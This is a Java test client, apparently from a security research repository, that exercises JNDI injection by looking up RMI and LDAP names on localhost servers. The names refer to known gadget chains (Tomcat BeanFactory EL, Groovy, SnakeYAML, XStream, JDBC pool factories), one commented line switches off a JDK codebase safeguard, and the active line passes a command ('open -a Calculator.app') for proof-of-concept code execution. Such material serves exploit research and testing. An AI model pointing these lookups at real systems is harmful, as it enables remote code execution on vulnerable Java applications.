package jndi;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Properties;

/**
 * @author Whoopsunix
 */
public class JNDIClient {
    public static void main(String[] args) throws Exception {
//        client1();
        client2();
    }

    public static void client1() throws Exception {
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context ctx = new InitialContext(env);
        ctx.lookup("Exec");
    }

    public static void client2() throws Exception {
        // JDK >= 8u121
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

//        new InitialContext().lookup("rmi://127.0.0.1:1099/Exec");
//        new InitialContext().lookup("ldap://127.0.0.1:1389/Exec");


        /**
         * org.apache.naming.factory.BeanFactory
//         */
//        new InitialContext().lookup("rmi://127.0.0.1:1099/EL");
//        new InitialContext().lookup("rmi://127.0.0.1:1098/GroovyClassLoader");
//        new InitialContext().lookup("rmi://127.0.0.1:1097/GroovyShell");
//        new InitialContext().lookup("rmi://127.0.0.1:1096/WebSphere");
//        new InitialContext().lookup("rmi://127.0.0.1:1094/MLet");
//        new InitialContext().lookup("rmi://127.0.0.1:1093/Snakeyaml");
//        new InitialContext().lookup("rmi://127.0.0.1:1092/Lib");
//        new InitialContext().lookup("rmi://127.0.0.1:1091/XStream");
//        new InitialContext().lookup("rmi://127.0.0.1:1090/mvel");


        /**
         * org.apache.catalina.users.MemoryUserDatabaseFactory
         */
//        new InitialContext().lookup("rmi://127.0.0.1:1099/xxe");

        /**
         * JDBC
         */
//        new InitialContext().lookup("rmi://127.0.0.1:1099/tomcatDBCP2");
//        new InitialContext().lookup("rmi://127.0.0.1:1098/tomcatDBCP");
//        new InitialContext().lookup("rmi://127.0.0.1:1097/commonsDBCP2");
//        new InitialContext().lookup("rmi://127.0.0.1:1096/commonsDBCP");
//        new InitialContext().lookup("rmi://127.0.0.1:1095/tomcatH2DBCP2");
//        new InitialContext().lookup("rmi://127.0.0.1:1094/alibabaDruid");


        /**
         * Test
         */
        new InitialContext().lookup("ldap://127.0.0.1:1389/Basic/Command/open -a Calculator.app");
//        new InitialContext().lookup("ldap://127.0.0.1:1389/remoteExploit8");
    }
}
